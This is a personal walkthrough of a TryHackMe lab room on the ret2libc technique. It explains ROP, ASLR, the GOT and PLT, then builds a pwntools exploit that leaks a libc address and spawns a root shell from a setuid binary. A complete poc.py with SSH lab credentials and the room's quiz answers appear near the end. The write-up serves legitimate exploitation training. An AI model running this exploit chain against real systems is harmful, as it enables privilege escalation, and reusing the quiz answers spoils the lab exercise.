<h1 align="center">ret2libc</h1>
<p align="center">2026, January 9 &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>! Let´s learn together. Access this walkthrough room <a href="https://tryhackme.com/room/ret2libc">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/ca4bab91-1bc2-4c15-bd12-8d0bfb6215c6"></p>

<br>
<h2>Task 1 . Prerequisites</h2>
<p><strong>Before we start.</strong></p>
<p>This room is a bit more advanced. If you are new to binary exploitation, reverse engineering, basics of c programming and scripting with Python, I strongly recommend you do the rooms linked below first to get some essential knowledge.<br>

- <a href="https://tryhackme.com/room/win64assembly">Windows x64 Assembly</a><br>
- <a href="https://tryhackme.com/room/pythonbasics">Python Basics</a><br>
- <a href="https://tryhackme.com/room/introtopwntools">Intro to Pwntools</a><br>
- <a href="https://tryhackme.com/room/windowsreversingintro">Windows Reversing Intro</a></p>

<p><em>Answer the question below</em></p>

<p>1.1. <em>I know the essentials of binary exploitation and want to continue!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . Introduction</h2>
<p>So welcome to the room ret2libc! 😎<br>

Before we start, deploy the machine attached to the task by pressing the green "Start Machine" button, as well as the AttackBox if you don't want to bother installing additional tools (using the "Start AttackBox" button at the top of the page) or you can use your own machine and connect through OpenVPN.<br>

Keep in mind the booting can take up to 3 minutes.<br>

And while you wait, let me tell you what return-oriented programming (ROP) is and how the ret2libc attack works.</p>

<h3>Return oriented programming (ROP)</h3>
<p>

- The basis of return-oriented programming is chaining together small chunks of code already present within the binary itself in such a way as to do what we wish. For example, reading flag.txt file, or even better, getting a shell.</p>

<h3>ret2libc attack</h3>
<p>

- The ret2libc is ROP with a small difference. The difference is that these small chunks of code which we'll be using are in the dynamically linked c library called libc.<br>
- Why do we use libc? Well, it's already linked to our binary, and libc has some of the functions which are interesting to us. One of the functions which are useful to us is called "system" which lets us execute anything passed to it.<br>
- Now, what if I tell you that in libc, there is also a string value that looks like this: "/bin/sh". I think you now know where this is going.<br>
- All we have to do is create an ROP chain (small chunks of code chained together) that passes the "/bin/sh" string as the argument to the system function and then call this function.<br>

And that's it. You now know how the ret2libc attack works.<br>

<strong>If you are done reading, and your machine is ready, use these ssh credentials to connect</strong>:<br>

- Username: <strong>andy</strong><br>
- Password: <strong>---------</strong></p>

<p><em>Answer the questions below</em></p>

<p>2.1. <em>Start the machine!</em><br>
<code>No answer needed</code></p>

<br>
<p>2.2. <em>What is the name of the function which is essential for ret2libc attack?</em><br>
<code>system</code></p>


```bash
:~/ret2libc# ssh andy@cyberrose.thm
...
andy@...:~$ 
```

<img width="1266" height="635" alt="image" src="https://github.com/user-attachments/assets/2e8823b8-8be6-4e27-acf3-ec5163c12ce8" />

<br>
<br>
<br>

<h2>Task 3 . Tools used </h2>
<p>Throughout the room, I'll be using listed tools that make the process of binary exploitation and reverse engineering much easier. I'll provide you links to the official documentation of every tool so you can install them on your machine if they aren't already. <br>

<strong>Pwntools and gdb with gef are already preinstalled in the attached VM</strong>.</p>

<h3>Pwntools</h3>
<p>The first thing on this list is a python library called pwntools, which we'll use for creating our exploit script. Pwntools should already be installed on Kali Linux.<br>

Link (pwntools): https://docs.pwntools.com/en/stable/install.html</p>

<h3>gdb + gef</h3>
<p>The second thing on the list is the debugger, I use gdb with a plugin called gef, but if you are using any other plugin like pwndbg or peda, you should be fine as well. Gdb should be available as a package on your Linux distribution.br>

Link (gdb): https://www.sourceware.org/gdb/<br>

Link (gef): https://gef.readthedocs.io/en/master/#setup</p>

<h3>Ghidra</h3>
<p>And the last thing on this list is a reverse engineering tool called Ghidra. Ghidra is already installed in the THM Attack box, so if you don't want to bother with downloading it, you can use it there.<br>

Link (ghidra): https://ghidra-sre.org/</p>

<p><em>Answer the question below</em></p>

<p>3.1. <em>I understand which tools are used throughout the room, and I am ready to continue!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 4 . Review of the binary</h2>
<p>After connecting to the box, go to the andy's home directory. There you should find a binary called exploit_me.<br>

You can see is that the binary is glowing red... hmm. What does that mean? I guess you already know that, but in case you don't, let's check the binary permissions.<br>

<code>ls -la exploit_me</code><br>

You can see there's a setuid bit in place which means we could maybe escalate privileges? (If the binary has a setuid bit set, it means you can run the binary as the owner of this binary). Let's keep this in mind for later and move on.</p>

<h3>Architecture</h3>
<p>The next thing we should check is the architecture of the binary, especially if it's a 32-bit or 64-bit executable. We can do that with the file command.</p>

<p><em>Architecture</em></p>

```bash
andy@ubuntu:~$ file exploit_me
exploit_me: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped
```

<p>As you can see we're working with a 64-bit binary.<br>

You might ask, why does that matter to us? There are many things we can take from that information, but the crucial section to us is which calling conventions are being used.<br>

In short, calling conventions are a set of rules used, for example, when the program is calling functions or passing parameters.<br>

Later, when we craft our ROP chain, we have to apply these rules so the program can understand our instructions and our exploit script can work without any problems.<br>

Now that we know what the calling conventions are and which architecture is our binary. We just have to find the exact calling convention for our binary. I made it easy for you and already found it on the Wikipedia page here, almost at the bottom.</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/c413f76f-2b5f-44a7-b84e-ee707169b9ef"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>


<p>The table above tells us which architecture this calling convention is, its name, which operating system, and on the right-hand side is the important stuff.  <br>

Let's use as an example any c-function that has one argument. Let's say puts, for example. Now let's go over what the last thing in this table tells us. It says that if we want to give some data as the argument to our puts, we first need to move the data into the $RDI register.<br>

If we would have some other function with more arguments, let's say three. For the first argument, we'd use register $RDI, for the second $RSI, and the last one $RDX.<br>

This way, our binary will understand what we want to pass as an argument to the function.</p>

<h3>Running the binary</h3>

<p>When we run a binary, it prompts us to type our name. When we do that, it prints out our name on the screen.</p>


<p><em>Running the binary</em></p>

```bash
andy@ubuntu:~$ ./exploit_me
Type your name:
andy
Your name is: andy
```

<p>The first thing that should hit our head when seeing the binary like this in the CTF is if the binary is vulnerable to buffer overflow. <br>

Let's try that by simply writing 30 A's instead of our name.</p>

<p><em>Buffer overflow</em></p>

```bash
andy@ubuntu:~$ ./exploit_me
Type your name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

<p>And as we can see, we got a segmentation fault which means that our binary is vulnerable to a buffer overflow attack.</p>

<h3>Finding the offset</h3>
<p>The next thing we need to figure out is the offset of this overflow. By offset, I mean the minimum number of A's (bytes) required for the segmentation fault to happen. We can find this in gdb and use a command called pattern, which comes with gef. Open the binary in the gdb with <code>gdb exploit_me</code><br>

Once we have our binary open, we need to generate the pattern that we'll be giving to our binary as an input instead of the  A's that we used earlier. Generate the pattern in gdb with the command <code>pattern create</code><br>

Once you have created the pattern, copy the output (= long text with lots of a's) and then run the binary inside of the gdb simply by typing: <code>r</code><br>

You'll get prompted for the name, so paste our created pattern here and hit enter. You should see values for the registers, the stack etc., from when the segmentation fault occurred, but that's not the important thing here. All we need to do is read the data from the $RSP register and use it in the pattern search command. We can do that easily with <code>pattern search $rsp</code><br>

If you followed me step by step, you should see the offset in the gdb by yourself and keep it in mind because we'll need it for crafting our exploit.<br>

<strong>Note</strong>: If we were working with a 32-bit binary, we'd look for the data for our pattern search in the $RIP register.</p>

<h3>Protections</h3>
<p>Another important part of reviewing the binary is looking for binary protections. For that, we can use command checksec, which comes preinstalled with <strong>pwntools</strong>.</p>

<p><em></em>Binary protections</em</p>

```bash
andy@ubuntu:~$ checksec exploit_me
[*] '/home/andy/exploit_me'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

<p>I'd like to talk about every protection in-depth but this would make this room even longer than it is, but if you followed my advice and completed room Intro To Pwntools, you should have a basic idea of what every protection is doing.<br>

The main things we should take from this:<br>

- The binary has <strong>Partial RELRO</strong>, which means that the global offset table is read and writable.<br>
- <strong>Stack canary</strong> isn't found, which means that if there is any buffer overflow, we can simply abuse it.<br>
- <strong>NX</strong> is enabled, which means that we cannot execute custom shellcode from the stack, and it's also the main reason we're using the ret2libc attack.<br>
- <strong>PIE</strong> is disabled, which means that our binary will always start at the address 0x400000 and won't be affected by ASLR.<br>

On the next task, we'll discuss the <strong>global offset table (GOT)</strong>, ASLR and how it affects our exploitation.</p>


<p><em>Answer the questions below</em></p>

<p>4.1. <em>What are the permissions of the exploit_me binary?</em> Hint: format: xxxxxxxxxx number owner group<br>
<code>-rwsrwxr-x 1 root root</code></p>

<br>
<p>4.2. <em>At which address will exploit_me binary start?</em><br>
<code>0x400000</code></p>


<br>
<p>4.3. <em>What is the overflow offset that we found in gdb?</em><br>
<code>18</code></p>

```bash
andy@...:~$ ls -la exploit_me
```

```bash
andy@...:~$ file exploit_me
```

<img width="1345" height="151" alt="image" src="https://github.com/user-attachments/assets/12a8ee4b-d9a9-4c7a-a640-a244956cc4c1" />

<br>
<br>

<img width="956" height="472" alt="image" src="https://github.com/user-attachments/assets/6ccff7eb-85fd-443c-82ea-a36e30e5ac9b" />

<br>
<br>
<br>

```bash
andy@...:~$ ./exploit_me
Type your name: 
rose
Your name is: rose
```

```bash
andy@...:~$ ./exploit_me
Type your name: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

<img width="1343" height="212" alt="image" src="https://github.com/user-attachments/assets/99cf4ccb-10d1-4f2f-9fa0-54e5c6ac765e" />

<br>
<br>
<br>

```bash
andy@...:~$ gdb exploit_me
...
gef> 
```

```bash
gef➤ pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa...aabvaabwaabxaabyaab
[+] Saved as '$_gef0'
```


<img width="1339" height="798" alt="image" src="https://github.com/user-attachments/assets/cf7ec6c0-3ba7-4661-a564-45e28b4d7d74" />

<br>
<br>
<br>

```bash
gef➤ pattern search $rsp
[+] Searching for '$rsp'
[+] Found at offset 18 (little-endian search) likely
```


<img width="1342" height="123" alt="image" src="https://github.com/user-attachments/assets/116e1eff-3615-4091-8878-2a054f53e6e4" />

<br>
<br>
<br>


```bash
:~/ret2libc# chmod 777 exploit_me
```

```bash
:~/ret2libc# file exploit_me
exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped
root@ip-10-65-100-222:~/ret2libc# checksec exploit_me
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.15.0).
    Update with: $ pip install -U pwntools
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/root/ret2libc/exploit_me'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

<img width="1319" height="386" alt="image" src="https://github.com/user-attachments/assets/023a24e8-1046-45e3-8096-f1e9bf996d3d" />

<br>
<br>
<br>
<h2>Task 5 . ASLR & GOT</h2>
<h3>Address space layout randomization (ASLR)</h3>
<p>Address space layout randomization is a technique involved in preventing exploitation of memory by randomly arranging the address space positions of key data areas of processes and the positions of the stack, heap and libraries.<br>

First of all, we can check if ASLR is turned on in our VM with the command:</p>

<p><em>ASRL check</em></p>

```bash
andy@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space
2
```

<p>According to <a href="https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/">Rosana</a> article, number 2 means full randomization. This means the ASLR is turned on.<br>

So how does it affect our binary, you might ask? Didn't I say that our binary isn't affected by ASLR because there is no PIE protection?<br>

Yes, you're right, it's not affected, but the thing which is being affected is the libc, which is dynamically linked to our binary and is mandatory for our ret2libc attack to work. If you look closer at the ASLR definition again, you can see the word library right at the end, and guess what libc is. Yes, that's right, it's a library.<br>

But, because of ASLR, we now cannot call the system function because we don't know the address of this function in libc.<br>

And even if we try to find the address of the system function when we run the program, the next time we run it, it'll be a different address. So how do we bypass this? Before telling you how to do that, let me quickly explain the global offset table.</p>

<h3>Global Offset Table (GOT)</h3>
<p>The global offset table is a section inside a program that holds addresses of dynamically linked functions<br>

Most programs don't include every function they use to reduce binary size. Instead, common functions, like those in libc, are "linked" into the program.<br>

All dynamic libraries are loaded into memory along with the main program at launch; however, functions aren't mapped to their actual code until they're first called.<br>

But, after these functions are called for the first time, their real addresses are "saved" in the section of the program called <srtong>.got.plt</code>.</p>

<h3>ASLR Bypass</h3>
<p>So, in theory, we need to leak the address of any function which is in libc and is being used in our binary (so it'll be saved in <srtong>.got.plt</code>). I'll show you how to find these functions later in Ghidra. But how do we leak it?<br>

We need some function that can print values and can take a pointer as an argument. The perfect functions for this are puts and <strong>printf</strong>.<br>

So what we can do now is to call puts and, as an argument, pass a pointer to any function that's inside <srtong>.got.plt</code>.<br>

For example: If we call puts and as an argument, we pass the address of the setbuf function inside of<srtong>.got.plt</code> section, then we should have leaked the real address of the sefbuf function inside a libc. And when we have this leak, we can calculate the base address of the libc.<br>

<strong>Libc base address => Start of the c library in memory</strong><br>

And when we have this base address, every time the binary is being run, the address is the same as it would have been when ASLR was turned off,  and from that, we can calculate offsets for every function inside of libc. Or we can even rebase our libc, which I'll talk about in the next task.<br>

Note: If you don't understand this on your first read, don't worry; take your time and read through it slowly. In the next tasks, I'll show you everything in practice so it might come all together once you see it.</p>

<p><em>Answer the question below</em></p>

<p>5.1. <em>What is the name of the section of the binary which is important for our leak?</em><br>
<code>.got.plt</code></p>


```bash
andy@...:~$ cat /proc/sys/kernel/randomize_va_space
2
```

<img width="1340" height="73" alt="image" src="https://github.com/user-attachments/assets/504d1aa9-4c14-4b87-9c98-fa9a7289ce1c" />

<br>
<br>
<br>
<h2>Task 6 . Examining in the Ghidra</h2>
<h3>Transfer the binary</h3>
<p>Ghidra is a GUI program, so we cannot run ghidra on an attached VM, but we have to run it on our own machine (or in the AttackBox) instead.<br> 

Before transferring the binary, make sure that your machine uses the same libc as the attached VM; otherwise, you could encounter some problems (you can use <code>ldd exploit_me</code> to do that). If you still have problems, I recommend using Kali Linux or the THM AttackBox to review the binary in ghidra.<br>

Let's start by transferring the exploit_me binary to your machine. We can do that with a python3 server.<br> 


In the attached VM run command:<br> 

<code>python3 -m http.server 4444</code><br> 

On your own machine (or in the AttackBox), run the command:<br> 

<code>wget http://10.65.166.144:4444/exploit_me</code></p>

<h3>Examine the binary in Ghidra</h3>
<p>Open the binary in Ghidra and analyze it. If you are ready, let's examine the main function.<br>

In the middle left is a window called Symbol Tree, and there's our main function inside a Functions folder; once you find it, double click on it.<br>

<code>Symbol Tree -> Functions -> main</code><br>

Now on the right side of the screen, you should see a decompiled main function that should look like this:</p>

<h6 align="center"><img width="300px" src="https://github.com/user-attachments/assets/92d27539-41ed-47e8-ae2c-ff184c2a9e18"><br>This image and all the theoretical content of<br>the present article is TryHackMe´s property.</h6>

<p>As you can see, Ghidra does a pretty good job when decompiling small binaries like ours.<br>

From what we can see, there's an array of chars called local_12 with a size of 10 bytes.<br> 

We know that our overflow offset is a little bigger than that. It's because, in memory between our buffer and instruction pointer, there is other data that we also need to overflow.<br>

On line 9, you can see that the input we provide to the binary is stored in this buffer. It's done by the gets function, which is dangerous, and you wouldn't use it in a standard program.<br>

Why is it dangerous? Because this function doesn't regulate the size of the input. This means we can provide input that is 30 bytes long, but our buffer only takes 10. This is why the segmentation fault is occurring. And it's also the reason why we can abuse this binary.<br>

There's another really interesting thing, and that's the setuid(0) function. It seems like a good day for us as an attacker.<br>

If you remember well, we found out that our binary had the setuid bit set, but that in itself wouldn't give us a root shell when running the exploit. That's because we aren't specifying the -p switch when passing our "/bin/sh" argument to our system function. In the libc, there is only string "/bin/sh" and not string "/bin/sh -p" which we'd need for that.<br>

The reason why it's not working without the -p switch is that the real UID of the process isn't matching the effective UID. If you want to read about real, effective and saved UID in Linux, you can click here.<br>

Anyway, this doesn't matter to us because we can escalate privileges with our ret2libc exploit even without the -p switch, thanks to the setuid(0) function inside of the binary</p>

<h3>Finding the leak function</h3>
<p>Now let's find our leak function.<br>

In the left upper corner, there's a window called Program Trees, where we can see sections of the program. We're interested in the section called .got.plt that we discussed earlier.<br>

<code>Program Trees -> exploit_me -> .got.plt</code><br>

When you double click on that, you should see which functions are in the .got.plt section.</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/bb00fdcf-a8e2-489c-a50f-007d6e3c29dc"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>On the left, you can see an address next to each function, and that address is exactly the one that we'll be passing to the puts function as an argument. As I said in the previous task, we can choose any function from these three (puts, printf, gets); it doesn't matter which function as long as we keep in mind which we've chosen.<br>

I'll use gets as my leak function. Now we have our argument ready, and the only thing we need to do is pass it to the puts function. But how do we call puts?<br>

We can find puts in the procedure linkage table (PLT) and call it from there. I won't be talking about PLT here, but we need to know where to find this PLT section in Ghidra. If you want to learn more about PLT and even some more about GOT, you can watch a fantastic video from LiveOverflow called Global Offset Table (GOT) and Procedure Linkage Table (PLT) on YouTube, which I recommend.<br>

Now let's look at the .plt section.<br>

<code>Program Trees -> exploit_me -> .plt</code><br>

The puts function inside the .plt section looks like this.</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/d051bd3e-1ffe-409e-8b58-75ece4659a4c"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>


<p>Now we have everything ready for our exploit!</p>

<p><em>Answer the questions below</em></p>

<p>6.1. <em>What is the name of the function that is under gets in .got.plt?</em><br>
<code>setuid</code></p>


<img width="1220" height="449" alt="image" src="https://github.com/user-attachments/assets/f83134c6-bc1f-4e87-ac81-36ead61f5591" />

<br>
<br>

<img width="1223" height="698" alt="image" src="https://github.com/user-attachments/assets/76e6ff5c-eab4-4f5f-87d6-99e504ea5b6a" />

<br>
<br>
<br>
<h2>Task 7 . Creating the exploit</h2>
<p>In this part, we'll create the exploit. Open vim or nano and create a new python script to start things off. If you prefer a different editor over vim or nano (which are installed in the attached VM), you can create this script on your own machine and then transfer it via a python server as we did with our exploit_me binary.</p>

<h3>Part 1</h3>

<p><em>Importing the library</em></p>

```bash
#!/usr/bin/env python3
from pwn import *
```

<p><code></code>#!/usr/bin/env python3</code> is a shebang that makes our script a standalone executable, which means we don't need to run the script with python3.<br>

On the second line, we see <code>from pwn import *</code> which means we're importing everything from the pwn library into our script.</p>

<h3>Part 2</h3>

<p><em>Defining variables</em></p>

```bash
context.binary = binary = './exploit_me'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()
```

<p>On the first line, we're assigning the exploit_me binary into the binary variable and then adding this binary to the context. Context is a global variable that automatically sets settings (like architecture, operating system, bit-width) for our binary. So later, when we'll use our binary variable, we don't have to specify every setting manually.<br>

On the next line, we're creating a variable called  <code>elf</code> so that we can manipulate it with our binary as an ELF object inside of our script. Once the variable has been created, we use that code>elf</code> variable to create an ROP object called code>rop</code>. We'll use both of these variables later in the code.<br>

Next, we're creating a variable called <code>libc</code> and assigning the full path of  <code>libc</code> to it. Our binary will be using  <code>libc</code> as an ELF object. If you don't know how to find which  <code>libc</code> our binary is using, you can do that with the command ldd: <code>ldd exploit_me</code><br>

The last thing we're doing is spawning our binary as a process. You can see that we didn't specify which process to spawn; that's because we added our binary into the context. Now we'll start creating the ROP chain to leak the gets function.</p>

<h3>Part 3</h3>

<p><em>First ROP chain</em></p>

```bash
padding = b'A'*18
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)
```



<h3>Part 4</h3>
<p><em>Sending and processing</em></p>

```bash
p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()
```

<h3>Part 5</h3>
<p><em>Sending and processing</em></p>

```bash
log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')
```

<h3>Part 6</h3>
<p><em>Second ROP chain</em></p>

```bash
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
```

<h3>Part 7</h3>
<p><em>Sending the final payload</em></p>

```bash
p.sendline(payload)
p.recvline()
p.interactive()
```

<p>Here we're just sending the second payload and cleaning out some unnecessary output. The last line starts the interactive mode, so we can interact with the created shell if everything went well.<br>

And that's about it. Go write the exploit yourself if you weren't following along step by step. And if you've done everything well, you should have root privileges, so go grab the flag!</p>

<p>7.1. <em>What is the flag?</em><br>
<code>_______________________</code></p>

```bash
:~# nmap -sC -sV -Pn -n -T4 -p- xx.xx.xxx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

```bash
:~/ret2libc# objdump -d exploit_me | grep "plt>"
0000000000400490 <.plt>:
00000000004004a0 <puts@plt>:
  4004ab:	e9 e0 ff ff ff       	jmpq   400490 <.plt>
00000000004004b0 <printf@plt>:
  4004bb:	e9 d0 ff ff ff       	jmpq   400490 <.plt>
00000000004004c0 <gets@plt>:
  4004cb:	e9 c0 ff ff ff       	jmpq   400490 <.plt>
00000000004004d0 <setuid@plt>:
  4004db:	e9 b0 ff ff ff       	jmpq   400490 <.plt>
  4005d9:	e8 f2 fe ff ff       	callq  4004d0 <setuid@plt>
  4005e5:	e8 b6 fe ff ff       	callq  4004a0 <puts@plt>
  4005f6:	e8 c5 fe ff ff       	callq  4004c0 <gets@plt>
  40060e:	e8 9d fe ff ff       	callq  4004b0 <printf@plt>
```

```bash
:~/ret2libc# objdump -T exploit_me | grep GLIBC
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 puts
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 printf
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 __libc_start_main
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 gets
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 setuid
```

```bash
andy@...:~$ ss -tunlp
Netid            State             Recv-Q            Send-Q                            Local Address:Port                         Peer Address:Port            Process            
udp              UNCONN            0                 0                                 127.0.0.53%lo:53                                0.0.0.0:*                                  
udp              UNCONN            0                 0                            xx.xx.xxx.xx%ens5:68                                0.0.0.0:*                                  
tcp              LISTEN            0                 128                                     0.0.0.0:22                                0.0.0.0:*                                  
tcp              LISTEN            0                 4096                              127.0.0.53%lo:53                                0.0.0.0:*                                  
tcp              LISTEN            0                 128                                        [::]:22                                   [::]:*  
```

```bash
:~/ret2libc# ldd exploit_me
	linux-vdso.so.1 (0x00007fffef76f000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f16c9633000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f16c9844000)
```


<img width="1320" height="797" alt="image" src="https://github.com/user-attachments/assets/9b56b787-fe4c-4e5d-a809-628475b75ce1" />

<br>
<br>
<br>

```bash
:~/ret2libc# scp andy@...:/lib/x86_64-linux-gnu/libc.so.6 .
andy@...'s password: 
libc.so.6                                                                                                                               100% 1982KB  84.4MB/s   00:00    
```

```bash
:~/ret2libc# cat poc.py

#!/usr/bin/env python3
from pwn import *

context.binary = binary =  './exploit_me'

elf = ELF(binary)
rop = ROP(elf)
PUTS_PLT = 0x4004a0

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = pop_rdi + 1

try:
    libc = ELF('./libc.so.6')
except:
    print("[-] lib.so.6 error")
    exit()

try:
    s = ssh(user='andy', host='xx.xx.xxx.xx', password='ret2libc!')
    p = s.process('/home/andy/exploit_me')
except Exception as e:
    print(f"[-] -------------------- Connection Error: {e}")
    exit()

print("\n[+] -------------------- Sending Payload 1 ... ")
padding = b'A' * 18 
payload = padding
payload += p64(pop_rdi)
payload += p64(elf.got.gets)
payload += p64(PUTS_PLT)
payload += p64(elf.symbols.main)

p.recvline(b'Type your name:')
p.clean()

p.sendline(payload)
p.recvline()

leak_raw = p.recvline().strip()

leak = u64(leak_raw.ljust(8, b'\0'))
log.success(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.success(f"Libc Base: {hex(libc.address)}")

print("\n[+] -------------------- Sending Payload 2 ... ")
payload = padding
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols.system)

p.clean()
p.sendline(payload)
p.recvline()
print("[*] Trying ...")
p.sendline(b'cat flag.txt; ls; id')
time.sleep(1)

try:
    print(p.recvall(timeout=2).decode(errors='ignore'))
except:
    pass

print("[*] Starting interactive mode...")
p.interactive()
```

```bash
:~/ret2libc# python3 poc.py
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/root/ret2libc/exploit_me'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] Loaded 14 cached gadgets for './exploit_me'
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/root/ret2libc/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
/usr/lib/python3/dist-packages/paramiko/transport.py:220: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
  "class": algorithms.Blowfish,
[+] Connecting to ... on port 22: Done
[*] andy@xx.xx.xxx.xx:
    Distro    Ubuntu 20.04
    OS:       linux
    Arch:     amd64
    Version:  5.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ...: pid 6111
[!] ASLR is disabled for '/home/andy/exploit_me'!

[+] -------------------- Sending Payload 1 ... 
[+] Gets leak => 0x7fa3e8166970
[+] Libc Base: 0x7fa3e80e3000

[+] -------------------- Sending Payload 2 ... 
[*] Trying ...
[+] Receiving all data: Done (0B)
[*] Stopped remote process 'exploit_me' on...5 (pid 6111)

[*] Starting interactive mode...
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```


```bash
andy@...:~$ pwd
/home/andy
```


<br>
<h2>Task 8 . Conclusion</h2>
<p>So if you got here, you should have a basic idea of how the ret2libc attack works.<br>

I made the exploiting a little bit harder and didn't turn off the ASLR.<br>

It's turned on by default on most Linux distributions, plus I wanted you to know that it is possible to bypass any of the protections.<br> 

You can still encounter some CTFs where the ASLR will be turned off; in that case, we don't have to leak the base address of the libc, and we can just look at it with the ldd. Thus we are skipping the first ROP chain.<br>

If you want to practice ret2libc, I recommend the TryHackMe room called Chronicle.<br>

- <a href="https://tryhackme.com/room/chronicle">Chronicle</a><br>

If you find any mistakes or just want to ask something, you can contact me on Twitter; the link is on my THM profile.</p>

<p><em>Answer the question below</em></p>

<p>8.1. <em>I hope you enjoyed the room and learned something new.</em><br>
<code>No answer needed</code></p>

<br>
<br>
<br>

